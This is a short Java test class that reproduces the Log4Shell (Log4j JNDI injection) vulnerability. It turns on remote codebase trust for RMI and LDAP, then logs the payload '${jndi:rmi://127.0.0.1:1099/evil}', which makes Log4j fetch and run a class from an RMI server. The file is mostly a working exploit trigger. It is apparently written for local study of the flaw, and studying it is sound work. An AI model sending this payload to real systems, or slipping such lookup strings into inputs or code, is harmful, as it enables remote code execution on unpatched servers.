import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @description: TODO
 * @author: invoker.lee
 * @date: 2021/12/22 23:45
 * @version: v1.0
 */
public class Log4j2Test {


    private static final Logger LOGGER = LogManager.getLogger();

    public static void main(String[] args) {

        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");

        String inputValue = "${jndi:rmi://127.0.0.1:1099/evil}";

//        String inputValue = "${java:os}";

        LOGGER.info("hello,{}",inputValue);
    }
}
